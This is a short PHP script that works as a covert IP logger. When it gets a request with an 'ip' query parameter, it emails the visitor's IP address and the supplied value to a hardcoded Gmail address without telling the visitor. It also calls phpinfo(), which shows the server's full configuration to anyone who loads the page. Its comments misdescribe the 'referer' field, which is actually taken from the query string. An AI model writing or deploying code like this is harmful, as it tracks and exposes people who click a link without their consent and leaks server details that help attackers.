<?php
phpinfo();
if (isset($_GET["ip"])) {
  $ip = $_SERVER["REMOTE_ADDR"]; // Get the user's IP address
  $referer = $_GET["ip"]; // Get the referring URL (optional)

  // Compose the email message
  $to = "johndmart16@gmail.com";
  $subject = "Users Ip Adress";
  $message = "IP Address: " . $ip . "\n";
  $message .= "Referring URL: " . $referer . "\n";

  // Send the email
  $headers = "From: johndmart16@gmail.com" . "\r\n" .
             "X-Mailer: PHP/" . phpversion();
  mail($to, $subject, $message, $headers);
}
?>
